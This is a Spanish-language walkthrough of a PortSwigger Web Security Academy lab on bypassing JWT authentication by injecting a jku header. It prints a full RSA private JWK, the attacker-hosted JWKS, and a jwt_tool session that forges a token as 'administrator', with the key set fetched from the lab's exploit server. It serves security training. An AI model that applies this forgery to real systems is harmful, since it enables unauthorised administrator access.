---
description: >-
  https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection
---

# Lab 5: JWT authentication bypass via jku header injection

Primero generamos una RSA Key con nuestra extension de Burp:

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Copiamos el valor de la key:

```json
{
    "p": "-2zNrL29VeM4PqJnXu9QEvxq5AYkfZCkPB1IBoh6vVWo0v5xk-oLAsrSa6oT0yfBXa1FLyJC1CqbC8xCaQrY1ei_hAEF2puKdS0MeeU-aruBkYZRZT4iX4-R9XT1FcLJVQqss8d-jwYCJJEntxjMWrktBua0n1YDEtcglaJb0Yk",
    "kty": "RSA",
    "q": "6MucFLHMg1fMOXVT5VE1lpCFYzSyTl99LiaXlZQ3d4GuFrNcryJ4W0F2lWRs26xmGb47r4fQNZjxmLj0GNmPFaMco_Wxv1M97SUKnLPpKGfdBlWn2MS8CaRIPumNFiZEllVOUu7fUmeUcHLho478BBoeC5KDGxMWMi5G4OnkD5M",
    "d": "BOFvj7BABdLLw5vX12KUrA1Bi-ruXhE9aph_9iBjstzQcHUOaRS1-O9_UmS5jdoNrCA3IbP2JZjjzpj-JLaX0uJAaYW35nxUfjAYcWd9jFokihNBrsN8NQz99VSLnvDazEJFOYavCFh0k-MNBd4xIfpjDevKbvvQTfSMF3f2ofjuDQA70RZw_qMy3QcpCYmTlNZAPi5Mth2jbCf_WlOngkrRo2T1weDTguUvDjhugQZsxChQ23vmSqVUN3-AdQnCwbxi1vITb9RoLRHdYa58kFKmd3MhaUSXocT6g8qW3-AmOphg3ub8rCzNn88TAinTO6X8se9N97kDDObQf7hj8Q",
    "e": "AQAB",
    "kid": "9c18e60f-cfa2-4858-8988-0f5f9b93426e",
    "qi": "XDDFqQi2s5ug1VPz-PNkF4u-U7VXwh-yozyl-x7EaSAU-VP3pMMJFIxZ-SHQPa_3sZCN5sMmI-UIPzLp0Yvgi3rJ5p1jSBrSh16zWxecdX-_7Qikm30dorpOVbIiJfgAxzVDIJY9zqJOCZ0v1ilhTt6zm8eihdDtt97pH5AbpyQ",
    "dp": "4tpdCUt5lhEaIoluM55B5Z-S4oMYUaM8THEvF5X1CPhNB3NFD2zQ2ogeK76dfJwWQGuiTNDg84YttwtpsFV1KCyFAJnbqk9FMkyfQSyykKL2WVOUBYF2ijqEO7B3olbKSc0D3oJVkr6dGFlQOEhLul_yXJO0zT9SLqGkaN7BceE",
    "dq": "4Rc-q6PfI4BZL5WKsUh8kEDdOLdTUQRzfZRDLZZKq3rwYXK8Q3sI9POvPXQE7cMcVffiri6b27cuo4TyQLTb7QfyQXbnjx9l2U7fm_U5lKAYzm80BBz11DzMvkgE603FM7b4LKhbtsoAdVofYo52j2DRfE8GBb_Gzm6AiiidI5E",
    "n": "5KKS9kRidf516xFIgURD0j1pERrzjnnGgwEEUsZTq-tgqtF_M5_w7ic03Q7P-s31DbQbbuhd-ZomVWsu-V09NIgDnk7x8oBFQ6FT5l6YlUL0JUrMN9eN6eUaOeqU26wkzSRR8Ppt-yYMI8wyrDsa7imLT2NtYqz560uVI1Ok3D6lzxBslo_m-BRMN5NjHyXMZNVkxRgahAx4UU71pwlHUCvl5A3JVRVHrCknvbYQoLi4fLgihCbCf5dp7r7TPNQ2HP7Ym5LkBormtUbuQgc7FgzxLPanqwkHXsiBux6Qo4X6hCPq8xe362NPCx4uanOJXX1GD9EN26U2u3PL6wRYqw"
}
```

Creamos el jwks:

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

El body del exploit debe estar dentro de un array asi:

```json
{
    "keys": [
{
    "p": "-2zNrL29VeM4PqJnXu9QEvxq5AYkfZCkPB1IBoh6vVWo0v5xk-oLAsrSa6oT0yfBXa1FLyJC1CqbC8xCaQrY1ei_hAEF2puKdS0MeeU-aruBkYZRZT4iX4-R9XT1FcLJVQqss8d-jwYCJJEntxjMWrktBua0n1YDEtcglaJb0Yk",
    "kty": "RSA",
    "q": "6MucFLHMg1fMOXVT5VE1lpCFYzSyTl99LiaXlZQ3d4GuFrNcryJ4W0F2lWRs26xmGb47r4fQNZjxmLj0GNmPFaMco_Wxv1M97SUKnLPpKGfdBlWn2MS8CaRIPumNFiZEllVOUu7fUmeUcHLho478BBoeC5KDGxMWMi5G4OnkD5M",
    "d": "BOFvj7BABdLLw5vX12KUrA1Bi-ruXhE9aph_9iBjstzQcHUOaRS1-O9_UmS5jdoNrCA3IbP2JZjjzpj-JLaX0uJAaYW35nxUfjAYcWd9jFokihNBrsN8NQz99VSLnvDazEJFOYavCFh0k-MNBd4xIfpjDevKbvvQTfSMF3f2ofjuDQA70RZw_qMy3QcpCYmTlNZAPi5Mth2jbCf_WlOngkrRo2T1weDTguUvDjhugQZsxChQ23vmSqVUN3-AdQnCwbxi1vITb9RoLRHdYa58kFKmd3MhaUSXocT6g8qW3-AmOphg3ub8rCzNn88TAinTO6X8se9N97kDDObQf7hj8Q",
    "e": "AQAB",
    "kid": "9c18e60f-cfa2-4858-8988-0f5f9b93426e",
    "qi": "XDDFqQi2s5ug1VPz-PNkF4u-U7VXwh-yozyl-x7EaSAU-VP3pMMJFIxZ-SHQPa_3sZCN5sMmI-UIPzLp0Yvgi3rJ5p1jSBrSh16zWxecdX-_7Qikm30dorpOVbIiJfgAxzVDIJY9zqJOCZ0v1ilhTt6zm8eihdDtt97pH5AbpyQ",
    "dp": "4tpdCUt5lhEaIoluM55B5Z-S4oMYUaM8THEvF5X1CPhNB3NFD2zQ2ogeK76dfJwWQGuiTNDg84YttwtpsFV1KCyFAJnbqk9FMkyfQSyykKL2WVOUBYF2ijqEO7B3olbKSc0D3oJVkr6dGFlQOEhLul_yXJO0zT9SLqGkaN7BceE",
    "dq": "4Rc-q6PfI4BZL5WKsUh8kEDdOLdTUQRzfZRDLZZKq3rwYXK8Q3sI9POvPXQE7cMcVffiri6b27cuo4TyQLTb7QfyQXbnjx9l2U7fm_U5lKAYzm80BBz11DzMvkgE603FM7b4LKhbtsoAdVofYo52j2DRfE8GBb_Gzm6AiiidI5E",
    "n": "5KKS9kRidf516xFIgURD0j1pERrzjnnGgwEEUsZTq-tgqtF_M5_w7ic03Q7P-s31DbQbbuhd-ZomVWsu-V09NIgDnk7x8oBFQ6FT5l6YlUL0JUrMN9eN6eUaOeqU26wkzSRR8Ppt-yYMI8wyrDsa7imLT2NtYqz560uVI1Ok3D6lzxBslo_m-BRMN5NjHyXMZNVkxRgahAx4UU71pwlHUCvl5A3JVRVHrCknvbYQoLi4fLgihCbCf5dp7r7TPNQ2HP7Ym5LkBormtUbuQgc7FgzxLPanqwkHXsiBux6Qo4X6hCPq8xe362NPCx4uanOJXX1GD9EN26U2u3PL6wRYqw"
}
    ]
}
```

Luego de lo anterior, modificamos el JWT y lo firmamos:

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

El resultado final es el siguiente:

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

El JWT final queda asi:

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

## Utilizando JWT\_TOOL

Ejecutamos el siguiente comando:

```bash
┌──(root㉿SPARTAN-SERVER)-[/home/hacker/BURP/jwt_tool]
└─# python3 jwt_tool.py eyJraWQiOiJiNjRhYThjYy01NmY5LTRlNzQtODE2My04ZmMyNTUwM2E1MmUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ2OTcxMywic3ViIjoid2llbmVyIn0.VxY8S44qihjURqTa00DJbKlmPxktWH8r02CdNjBMHkCQOYRWDq1ydQEZkY82b5h63XFX7RJ8rWHPbDF9MlV84LvIOl-pmiPt-Pd6F73JIuwECjMfQjMDnzpa9Wb0P_KCsFqSRK2VA5U6Yxr7g3fNx4q9tk0EH3rCqro3KTauFHHkXELoB4u6DOU9Ue6YguHygf2xJzPjnXnoqX_lxVF5ToGcSPgPeToJO67ObvBZHTybw886YVb0gxMKjVpQqGpxaAY2sVB7sgFT1GzzaMs7H120SKqcpsTYIkSPVHLKzusbpWW19jRYycQBVOWbfqHBTMapvi9en-FMjK8COGMtgg -X s -ju https://exploit-0a04005b04094f4380a57570013900eb.exploit-server.net/jwks.json -T

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:


====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] kid = "b64aa8cc-56f9-4e74-8163-8fc25503a52e"
[2] alg = "RS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of kid is: b64aa8cc-56f9-4e74-8163-8fc25503a52e
Please enter new value and hit ENTER
> jwt_tool
[1] kid = "jwt_tool"
[2] alg = "RS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] iss = "portswigger"
[2] exp = 1717469713    ==> TIMESTAMP = 2024-06-03 21:55:13 (UTC)
[3] sub = "wiener"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 3

Current value of sub is: wiener
Please enter new value and hit ENTER
> administrator
[1] iss = "portswigger"
[2] exp = 1717469713    ==> TIMESTAMP = 2024-06-03 21:55:13 (UTC)
[3] sub = "administrator"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
Paste this JWKS into a file at the following location before submitting token request: https://exploit-0a04005b04094f4380a57570013900eb.exploit-server.net/jwks.json
(JWKS file used: /root/.jwt_tool/jwttool_custom_jwks.json)
/root/.jwt_tool/jwttool_custom_jwks.json
jwttool_a9bbfc25f396c70765690e2419b03758 - Signed with JWKS at https://exploit-0a04005b04094f4380a57570013900eb.exploit-server.net/jwks.json
[+] eyJraWQiOiJqd3RfdG9vbCIsImFsZyI6IlJTMjU2Iiwiamt1IjoiaHR0cHM6Ly9leHBsb2l0LTBhMDQwMDViMDQwOTRmNDM4MGE1NzU3MDAxMzkwMGViLmV4cGxvaXQtc2VydmVyLm5ldC9qd2tzLmpzb24ifQ.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ2OTcxMywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.gi-MLU-HNg0IE5G1txdAoFaBIH5sI8MPnG39RcRp-Oo6w72Akl6e2pEhP-Nt2RsPGf5hsnecEyB1LLpmxXqx1feYh2SZVSBTU1QmgkjfJz95J_sVh9ZNVGqRiHjAvnQLNhBBE4a3F3sZTiUJHvLDPza880FlbCLVHR4f57TAUNzqt1Ed-jXUYANXx4RDqnnkh-g6PIpLQ3ZUsXyLIYwmdAwgGthqFlihMtGxAd0uRpJZScvYtefyzOdmd9K5mzpJgvixOe6WaShdmZ1Dk8olDvrbGpaHiPkvb3zPaMuKLc7V9-F7zbluL7UfbwwzQJjU749tmvdGgOIJPD1y-2pLfQ
```

Luego de lo anterior, hay que modificar el exploit:

```json
┌──(root㉿SPARTAN-SERVER)-[/home/hacker/BURP/jwt_tool]
└─# cat /root/.jwt_tool/jwttool_custom_jwks.json
{
    "keys":[
        {
            "kty":"RSA",
            "kid":"jwt_tool",
            "use":"sig",
            "e":"AQAB",
            "n":"pj6JLmRpdPRRPuh7RS2ir3CcDrmwILr4Ffj-AR0VCCN-hbN_R2RquIlVeP7bOTMhSYk2SG0Jvnmjkr0i3sMVMTi64L3vRDEuY3e7O1bRjFrrfKw4hNn5svGf-xN74JnPFJEqvvIEyek-BX5eo7sHlP1maDta3H98RX0BckNxjRS0eXfyxG_q-K75DD6SNX-hxR00Wx60KXkLV5WvCKN-b34uMc_TXN3jBZO2xpQ1l7WlJ1fFis9-miF222oZ9irsf1OY4B66JBi_0QbOv67l_YhM1j_uwgmE4NOIYA2VpiHQjHBinFan8WNjDOXKAoy3_Kf0QtnTjOWUWQ08SkUzWQ"
        }
    ]
}
```

Modificamos el exploit:

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

Y listo:

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

El JWT final quedo asi:

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
